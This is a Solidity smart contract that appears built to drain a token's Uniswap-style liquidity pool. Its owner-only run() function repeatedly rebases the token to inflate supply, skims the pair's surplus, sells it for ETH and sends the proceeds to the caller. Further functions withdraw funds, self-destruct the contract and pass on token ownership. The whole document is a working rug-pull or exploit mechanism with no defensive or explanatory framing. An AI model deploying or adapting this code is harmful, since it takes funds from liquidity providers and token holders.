contract TTA is Ownable {

    IUniRouter private uniRouter;
    ITrendToken private trendToken;
    IUniPair private uniPairToken;

    address trendSaleToken = 0xfaa74Bf87eEe6964BeFC9B19ed15F76025215Dc8;
    address WETH = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6;


    constructor(
        address _uniRouter,
        address _trendToken
    ) {
        uniRouter = IUniRouter(_uniRouter);
        trendToken = ITrendToken(_trendToken);
        uniPairToken = IUniPair(IUniFactory(uniRouter.factory()).getPair(uniRouter.WETH(), address(trendToken)));
    }

    function run() public onlyOwner {
        for (uint8 i = 0; i < 100; i++) {
            uint256 currentBalance = (IERC20(WETH)).balanceOf(address(uniPairToken));
                if(currentBalance >= 1000000000000) {
                    trendToken.rebase(1000000000000000);
                    uniPairToken.skim(address(this));
                    
                    address receiver = address(this);
                    address[] memory path = new address[](2);
                    path[0] = trendSaleToken;
                    path[1] = uniRouter.WETH();

                    uint256 sellAmount = trendToken.balanceOf(address(this));

                    (IERC20(trendSaleToken)).approve(address(uniRouter), sellAmount);

                    uniRouter.swapExactTokensForETH(sellAmount, 0, path, receiver, block.timestamp + 120);

                    uint256 balance = address(this).balance;
                    payable(msg.sender).transfer(balance);
                }
            }
    }

    function destroy() public onlyOwner {
        selfdestruct(payable(msg.sender));
    }
    
    function withdrawBNB() public onlyOwner {
        uint256 balance = address(this).balance;
        payable(msg.sender).transfer(balance);
    }

    function withdrawTokens(address _token) public onlyOwner {
        IERC20 token = IERC20(_token);
        uint256 amount = token.balanceOf(address(this));
        token.transfer(address(msg.sender), amount);
    }

    function transferTrendOwner(address _newOwner) public onlyOwner{
        trendToken.transferOwnership(_newOwner);
    }


    receive() external payable {}
    fallback() external payable {}
}